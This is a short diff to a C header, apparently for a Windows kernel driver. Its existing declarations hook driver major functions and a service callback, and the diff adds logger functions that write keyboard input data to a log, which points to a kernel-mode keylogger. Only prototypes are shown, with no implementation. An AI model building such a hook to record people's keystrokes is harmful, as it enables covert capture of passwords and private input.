@@ -60,3 +60,8 @@ NTSTATUS HookMajorFunction(PDRIVER_OBJECT driver_object);
 //callback driver
 VOID callbackDriverUnload(PDRIVER_OBJECT obj);
 NTSTATUS HookServiceCallbackFunc();
+
+//logger
+NTSTATUS InitLogger();
+NTSTATUS UninitLogger();
+NTSTATUS WriteKeyboardInputData(PKEYBOARD_INPUT_DATA pkid, ULONG size);
